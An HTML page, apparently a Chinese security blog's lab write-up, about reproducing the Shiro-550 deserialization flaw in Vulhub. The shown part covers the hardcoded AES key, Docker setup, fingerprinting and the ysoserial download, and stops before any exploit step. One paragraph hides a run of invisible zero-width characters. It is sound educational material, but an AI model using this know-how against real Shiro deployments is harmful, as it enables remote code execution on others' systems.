@@ -1,0 +1,701 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Shiro-550反序列化漏洞复现 | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Apache Shiro RememberMe 硬编码 AES 密钥（CVE-2016-4437）反序列化 RCE 复现：漏洞原理、Vulhub 环境搭建、URLDNS/DNSlog 无回显验证、CC6 链反弹 shell 与防御加固">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro-550反序列化漏洞复现">
+<meta property="og:url" content="https://jasmine-iris.top/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="Apache Shiro RememberMe 硬编码 AES 密钥（CVE-2016-4437）反序列化 RCE 复现：漏洞原理、Vulhub 环境搭建、URLDNS/DNSlog 无回显验证、CC6 链反弹 shell 与防御加固">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/cover.webp">
+<meta property="article:published_time" content="2026-09-14T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-14T09:07:22.862Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="Java反序列化">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/cover.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Shiro-550反序列化漏洞复现",
+  "url": "https://jasmine-iris.top/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
+  "image": "https://img.jasmine-iris.top/posts/Shiro-550反序列化漏洞复现/cover.webp",
+  "datePublished": "2026-09-14T02:00:00.000Z",
+  "dateModified": "2026-09-14T09:07:22.862Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "https://jasmine-iris.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://img.jasmine-iris.top/img/photo.png"><link rel="canonical" href="https://jasmine-iris.top/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Shiro-550反序列化漏洞复现',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/font/lxgwwenkaigbscreen/result.min.css"><link rel="preload" as="style" href="/font/lxgwwenkaigbscreen/result.min.css"><link rel="stylesheet" href="/css/light-bg13.css?v=17"><link rel="stylesheet" href="/css/top-img.css"><link rel="preload" as="image" href="https://img.jasmine-iris.top/img/leaf-arrow-forest-36.png"><link rel="preload" as="image" href="https://img.jasmine-iris.top/img/leaf-arrow-forest-hand-36.png"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><link rel="stylesheet" href="/css/theme-bg.css?v=1"><link rel="stylesheet" href="/css/context-menu.css?v=1"><link rel="stylesheet" href="/css/post-extras.css?v=2"><link rel="stylesheet" href="/css/link-style.css?v=1"><link rel="stylesheet" href="/css/talk.css?v=2"><script src="/js/live2d-lib/L2Dwidget.min.js?v=1"></script><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Jasmine_Iris" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://img.jasmine-iris.top/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw fas fa-feather-alt"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/quiz/"><i class="fa-fw fas fa-graduation-cap"></i><span> SecLearn 刷题</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/feedback/?p=blog"><i class="fa-fw fas fa-comment-dots"></i><span> 意见箱</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://img.jasmine-iris.top/posts/Shiro-550反序列化漏洞复现/cover.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">Shiro-550反序列化漏洞复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw fas fa-feather-alt"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/quiz/"><i class="fa-fw fas fa-graduation-cap"></i><span> SecLearn 刷题</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/feedback/?p=blog"><i class="fa-fw fas fa-comment-dots"></i><span> 意见箱</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Shiro-550反序列化漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-14T02:00:00.000Z" title="发表于 2026-09-14 10:00:00">2026-09-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-14T09:07:22.862Z" title="更新于 2026-09-14 17:07:22">2026-09-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">靶机练习</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/vulhub/">vulhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image:url(https://img.jasmine-iris.top/posts/Shiro-550反序列化漏洞复现/cover.webp);"></div><article class="container post-content" id="article-container"><h1 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h1><h2 id="1-1-什么是-Apache-Shiro？"><a href="#1-1-什么是-Apache-Shiro？" class="headerlink" title="1.1 什么是 Apache Shiro？"></a>1.1 什么是 Apache Shiro？</h2><p>Apache Shiro 是<strong>Java 开源安全框架</strong>，专门做Web应用的身份安全模块，很多Java Web项目（网站、后台管理系统）会集成它。<br>它主要负责4件核心工作：‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+<ul>
+<li>身份认证：登录校验账号密码</li>
+<li>授权：判断你有没有权限访问页面/接口</li>
+<li>会话管理：维持用户登录状态</li>
+<li>RememberMe（记住我）：勾选“记住我”，关闭浏览器下次不用重新登录</li>
+</ul>
+<blockquote>
+<p>这个漏洞，就出在 RememberMe 记住我这个功能上。</p>
+</blockquote>
+<hr>
+<h2 id="1-2-RememberMe-正常的工作逻辑"><a href="#1-2-RememberMe-正常的工作逻辑" class="headerlink" title="1.2 RememberMe 正常的工作逻辑"></a>1.2 RememberMe 正常的工作逻辑</h2><p>正常场景：我们登录网站勾选【记住我】</p>
+<ol>
+<li>服务器把我们的用户身份对象（Java对象，包含用户名等信息）<strong>序列化</strong>，转成一串二进制字节；</li>
+<li>用内置AES密钥对这串二进制做加密；</li>
+<li>加密后的字符串放到Cookie，字段名叫<code>rememberMe</code>，返回给浏览器保存；</li>
+<li>下次我们再来访问网站，浏览器自动带上这个<code>rememberMe</code>Cookie；</li>
+<li>服务器读取Cookie，<strong>用同一个AES密钥解密</strong>，再反序列化变回Java对象，识别我是谁，直接免登录。</li>
+</ol>
+<hr>
+<h2 id="1-3-CVE-2016-4437-漏洞成因"><a href="#1-3-CVE-2016-4437-漏洞成因" class="headerlink" title="1.3 CVE-2016-4437 漏洞成因"></a>1.3 CVE-2016-4437 漏洞成因</h2><p>Shiro 1.2.4及以下版本，<strong>源码里直接硬编码写死了AES加密密钥</strong>：<br><code>kPH+bIxk5D2deZiIxcaaaA==</code><br>这个密钥是公开的，所有人都能从源码里找到。</p>
+<p>漏洞发生完整逻辑：</p>
+<ol>
+<li>密钥固定公开 → <strong>攻击者可以自己加密，伪造rememberMe内容</strong>；</li>
+<li>攻击者使用<code>ysoserial</code>工具，构造<strong>恶意Java序列化对象</strong>（Gadget利用链）；</li>
+<li>用这个公开固定AES密钥加密恶意对象，生成伪造的<code>rememberMe</code>Cookie；</li>
+<li>攻击者发送HTTP请求，带上伪造的rememberMe Cookie访问网站；</li>
+<li>服务器收到Cookie：先用内置硬编码密钥解密 → 拿到二进制序列化数据；</li>
+<li><strong>服务器没有任何校验，直接对不可信的数据执行反序列化</strong>；</li>
+<li>在反序列化解析对象的过程中，触发预先构造好的恶意代码，实现<strong>远程代码执行RCE</strong>。</li>
+</ol>
+<blockquote>
+<p>即：<br>✅ 硬编码固定AES密钥（攻击者可控加密内容）<br>✅ 对来自Cookie的外部不可信输入，直接反序列化，没有校验</p>
+</blockquote>
+<hr>
+<h2 id="1-4-版本范围"><a href="#1-4-版本范围" class="headerlink" title="1.4 版本范围"></a>1.4 版本范围</h2><p>受影响版本：<strong>Apache Shiro ≤ 1.2.4</strong><br>在 1.2.5 版本修复：不再使用固定硬编码密钥，改成项目部署时，由用户自己配置独立密钥。</p>
+<hr>
+<h2 id="1-5-漏洞特点"><a href="#1-5-漏洞特点" class="headerlink" title="1.5 漏洞特点"></a>1.5 漏洞特点</h2><ol>
+<li><strong>不需要账号密码，不需要登录</strong>，直接发送带伪造rememberMe的请求就能打；</li>
+<li>属于Java反序列化漏洞，依赖Java Gadget链（最常用CommonsCollections1）；</li>
+<li>漏洞编号CVE-2016-4437，圈内俗称Shiro550（因为漏洞在issue编号550）。</li>
+</ol>
+<hr>
+<h2 id="1-6-补充：什么是序列化-反序列化？"><a href="#1-6-补充：什么是序列化-反序列化？" class="headerlink" title="1.6 补充：什么是序列化/反序列化？"></a>1.6 补充：什么是序列化/反序列化？</h2><ul>
+<li>序列化：把内存里的Java对象，变成一串二进制字节，方便网络传输、存Cookie；</li>
+<li>反序列化：反过来，把二进制字节，恢复成内存里的Java对象；</li>
+</ul>
+<blockquote>
+<p>风险点：<strong>反序列化的时候会自动执行对象里的部分代码</strong>。如果对象是恶意构造的，就执行攻击代码。</p>
+</blockquote>
+<hr>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><blockquote>
+<p>环境说明：基于 Kali Linux 搭建的 Vulhub 靶场</p>
+<p>漏洞：CVE-2016-4437 Shiro550<br>依赖：Docker、docker-compose，vulhub 源码包已经提前下载到本机</p>
+</blockquote>
+<h2 id="Q：vulhub-如何搭建？"><a href="#Q：vulhub-如何搭建？" class="headerlink" title="Q：vulhub 如何搭建？"></a>Q：vulhub 如何搭建？</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_50750081/article/details/135946629">https://blog.csdn.net/weixin_50750081/article/details/135946629</a></p>
+<hr>
+<h2 id="①-进入靶场目录"><a href="#①-进入靶场目录" class="headerlink" title="① 进入靶场目录"></a>① 进入靶场目录</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/vulhub/shiro/CVE-2016-4437</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="②-后台启动容器"><a href="#②-后台启动容器" class="headerlink" title="② 后台启动容器"></a>② 后台启动容器</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>-d</code> = detach，后台运行，不占用终端</li>
+<li>第一次执行会<strong>自动拉取镜像</strong>（有国内镜像加速，速度更快）</li>
+<li>等待下载、构建、启动完成</li>
+</ul>
+<hr>
+<h2 id="③-查看容器是否成功启动"><a href="#③-查看容器是否成功启动" class="headerlink" title="③ 查看容器是否成功启动"></a>③ 查看容器是否成功启动</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker-compose ps</span><br></pre></td></tr></tbody></table></figure>
+
+<p>✅ 判断成功标准：</p>
+<ul>
+<li>看到容器状态是 <code>Up</code></li>
+<li>端口映射：<code>0.0.0.0:8080-&gt;8080/tcp</code></li>
+</ul>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376767754_94uok2.webp" loading='lazy'></p>
+<hr>
+<h2 id="④-访问靶场页面"><a href="#④-访问靶场页面" class="headerlink" title="④ 访问靶场页面"></a>④ 访问靶场页面</h2><p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376770336_kzpcfe.webp" loading='lazy'></p>
+<p>kali 的 IP：192.168.23.151</p>
+<p>在物理机浏览器打开：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.151:8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p>或者直接在Kali浏览器打开：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376772328_tc8yn9.webp" loading='lazy'></p>
+<p>出现Shiro登录页面，靶场启动成功。</p>
+<hr>
+<h2 id="常用配套命令"><a href="#常用配套命令" class="headerlink" title="常用配套命令"></a>常用配套命令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看实时日志（排错用）</span></span><br><span class="line"><span class="built_in">sudo</span> docker compose logs -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止靶场（保留镜像，下次可直接up）</span></span><br><span class="line"><span class="built_in">sudo</span> docker compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止并删除镜像（彻底清理）</span></span><br><span class="line"><span class="built_in">sudo</span> docker compose down --rmi all</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="简单排错"><a href="#简单排错" class="headerlink" title="简单排错"></a>简单排错</h2><ol>
+<li>端口8080被占用：报错端口冲突，修改<code>docker-compose.yml</code>，把宿主机端口改成别的，比如<code>8081:8080</code></li>
+<li>镜像拉取卡住：docker加速器已经配置，重新执行<code>docker compose up -d</code></li>
+</ol>
+<hr>
+<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>根因：rememberme 密钥泄露</p>
+<h2 id="3-1-指纹探测"><a href="#3-1-指纹探测" class="headerlink" title="3.1 指纹探测"></a>3.1 指纹探测</h2><p>随便输一个账号密码，再 F12 查看网络 –&gt;cookie</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376773857_hmjf67.webp" loading='lazy'></p>
+<p>看到 <code>rememberMe</code> 的 value 是 <code>deleteMe</code>，<strong>确认目标使用 Apache Shiro 框架</strong>，第一步指纹探测完成。  </p>
+<hr>
+<h2 id="3-2-验证漏洞"><a href="#3-2-验证漏洞" class="headerlink" title="3.2  验证漏洞"></a>3.2  验证漏洞</h2><blockquote>
+<p>已经探测出 <code>rememberMe=deleteMe</code>，确认目标是 Shiro 框架，但<strong>不确定是否存在 CVE-2016-4437</strong></p>
+</blockquote>
+<h3 id="Q1：ysoserial-是什么？"><a href="#Q1：ysoserial-是什么？" class="headerlink" title="Q1：ysoserial 是什么？"></a>Q1：ysoserial 是什么？</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h4><p>ysoserial 是安全研究者 <strong>frohoff</strong> 开发的 <strong>Java反序列化Payload生成工具</strong>。自动生成构造好的恶意Java序列化二进制数据，用来打Java反序列化漏洞（Shiro550、Weblogic、JBoss等）</p>
+<hr>
+<h4 id="2-核心概念"><a href="#2-核心概念" class="headerlink" title="2. 核心概念"></a>2. 核心概念</h4><ol>
+<li><strong>Gadget Chain（利用链/小工具链）</strong></li>
+</ol>
+<p>Java 反序列化<strong>本身不会直接执行命令</strong>。<br>Gadget（小工具）就是项目 jar 包里<strong>本来就存在的一些类和方法</strong>；<strong>利用链 = 把这些现成 Gadget 按顺序串起来</strong>，当 Java 进行反序列化时，会自动依次调用这一串方法，最终执行系统命令。<br><code>ysoserial</code>内置了大量写好的利用链：</p>
+<ul>
+<li><code>URLDNS</code>：仅触发DNS解析，<strong>无法执行系统命令</strong>，适合简易探测</li>
+<li><code>CommonsCollections</code>： 选 CC 系列利用链的第一步，就是先确认目标有没有这个 jar、是 3.x 还是 4.x。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">利用链</th>
+<th>限制条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">CC1</td>
+<td>JDK 版本必须 ≤ jdk8u71，高版本 JDK 会失效</td>
+</tr>
+<tr>
+<td align="center">CC3</td>
+<td>依赖 TemplatesImpl 类，对 JDK 版本敏感，兼容性差</td>
+</tr>
+<tr>
+<td align="center">CC5</td>
+<td>要求 JDK ≥ jdk8u76，版本限制单向</td>
+</tr>
+<tr>
+<td align="center">CC6</td>
+<td>入口为 HashSet，依靠 InvokerTransformer 完成反射调用；JDK6 ~ JDK21 大范围兼容，几乎无版本门槛</td>
+</tr>
+<tr>
+<td align="center">CC7</td>
+<td>链路逻辑复杂，稳定性弱于 CC6</td>
+</tr>
+</tbody></table>
+<hr>
+<ol start="2">
+<li>输出产物<br>工具输出<strong>二进制序列化数据</strong>，不是明文。<br>Shiro场景下：这个二进制还需要经过AES加密+Base64编码，才能放进rememberMe Cookie。</li>
+</ol>
+<blockquote>
+<p>⚠️ysoserial<strong>不发包、不做加密</strong>，它只负责生成恶意二进制payload。</p>
+</blockquote>
+<hr>
+<h4 id="3-下载"><a href="#3-下载" class="headerlink" title="3. 下载"></a>3. 下载</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>-O ysoserial.jar</code>：下载后重命名为 <code>ysoserial.jar</code></li>
+</ul>
+<p> GitHub 下载超时，用：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://ghfast.top/https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376775974_2w19sf.webp" loading='lazy'></p>
+<p>✅ 下载校验命令：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> </span><br><span class="line"><span class="comment"># 能看到文件就代表下载成功</span></span><br><span class="line"><span class="comment"># 测试是否能正常运行</span></span><br><span class="line">java -jar ysoserial.jar</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行后弹出ysoserial帮助信息，说明没问题。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376778054_3f5y4s.webp" loading='lazy'></p>
+<p> 把 jar 复制到 shiro 靶场目录  </p>
